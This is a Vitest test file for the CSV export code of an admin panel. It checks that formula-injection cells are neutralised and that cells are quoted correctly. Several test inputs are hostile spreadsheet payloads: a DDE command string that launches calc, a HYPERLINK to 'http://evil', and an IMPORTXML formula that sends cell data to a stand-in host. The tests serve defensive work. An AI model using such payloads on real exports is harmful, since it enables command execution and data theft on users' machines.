import { describe, expect, it } from 'vitest';
import { buildCsvBody, escapeCell, neutralizeFormula } from '../csv';

/* ============================================================================
 * CSV formula injection (G5).
 *
 * Every export in the panel — 22 call sites across 12 pages — funnels through
 * exportCsv. Several of them emit operator-entered free text (audit remarks) and
 * customer-entered names, so a cell that Excel evaluates as a formula is a real
 * path from "someone typed a name" to "someone's machine ran a command".
 *
 * The DOM half of exportCsv (Blob + anchor click) is not covered here — these
 * tests run in the default node environment. The serialisation is what carries
 * the risk, so it lives in pure functions that can be tested headlessly.
 * ==========================================================================*/

describe('neutralizeFormula — the four classic leads', () => {
  it('prefixes a leading = (formula)', () => {
    expect(neutralizeFormula('=1+1')).toBe("'=1+1");
  });

  it('prefixes a leading + ', () => {
    expect(neutralizeFormula('+1+1')).toBe("'+1+1");
  });

  it('prefixes a leading -', () => {
    expect(neutralizeFormula('-1+1')).toBe("'-1+1");
  });

  it('prefixes a leading @', () => {
    expect(neutralizeFormula('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
  });

  it('prefixes a tab-led cell (leading whitespace is stripped before parsing)', () => {
    expect(neutralizeFormula('\t=1+1')).toBe("'\t=1+1");
  });

  it('prefixes a CR-led cell', () => {
    expect(neutralizeFormula('\r=1+1')).toBe("'\r=1+1");
  });

  it('neutralises a real-world command-injection payload', () => {
    expect(neutralizeFormula('=cmd|\'/c calc\'!A0')).toBe("'=cmd|'/c calc'!A0");
  });

  it('leaves an ordinary cell untouched', () => {
    expect(neutralizeFormula('Priya Sharma')).toBe('Priya Sharma');
  });

  it('leaves a negative number rendered as text alone only if it does not lead with -', () => {
    // A genuine negative amount DOES lead with '-', so it is prefixed. That is
    // the correct trade-off: the cell still reads as -4200 to a human, and no
    // export in this app relies on a negative cell staying numeric.
    expect(neutralizeFormula('-4200')).toBe("'-4200");
    expect(neutralizeFormula('4200')).toBe('4200');
  });

  it('does not prefix a cell that merely contains = later on', () => {
    expect(neutralizeFormula('rate=12%')).toBe('rate=12%');
  });
});

describe('escapeCell — quoting still works, and composes with neutralisation', () => {
  it('leaves a plain cell unquoted and unchanged', () => {
    expect(escapeCell('Gold Loan')).toBe('Gold Loan');
  });

  it('quotes a cell containing a comma', () => {
    expect(escapeCell('Sharma, Priya')).toBe('"Sharma, Priya"');
  });

  it('quotes and doubles an embedded quote', () => {
    expect(escapeCell('he said "no"')).toBe('"he said ""no"""');
  });

  it('quotes a cell containing a newline', () => {
    expect(escapeCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('handles a cell needing BOTH quote-escaping and formula-prefixing', () => {
    // Leading '=' must be neutralised, the comma forces quoting, and the inner
    // quotes must be doubled — with the injected ' inside the quotes.
    expect(escapeCell('=HYPERLINK("http://evil","click")')).toBe(
      '"\'=HYPERLINK(""http://evil"",""click"")"',
    );
  });

  it('renders null and undefined as an empty cell', () => {
    expect(escapeCell(null)).toBe('');
    expect(escapeCell(undefined)).toBe('');
  });

  it('passes numbers through unchanged', () => {
    expect(escapeCell(42000)).toBe('42000');
  });
});

describe('buildCsvBody', () => {
  it('joins headers and rows with CRLF and commas', () => {
    expect(buildCsvBody(['A', 'B'], [['1', '2'], ['3', '4']])).toBe('A,B\r\n1,2\r\n3,4');
  });

  it('neutralises a malicious cell in the middle of a real export row', () => {
    const body = buildCsvBody(
      ['Date', 'Actor', 'Remark'],
      [['2026-08-03', 'ops@fuehrer.in', '=IMPORTXML(CONCAT("http://x/?v=",A1),"//a")']],
    );
    expect(body).toContain('\'=IMPORTXML');
    // and the raw formula must not survive at the start of a field
    expect(body).not.toContain(',=IMPORTXML');
  });

  it('neutralises a malicious header too', () => {
    expect(buildCsvBody(['=1+1'], [])).toBe("'=1+1");
  });
});
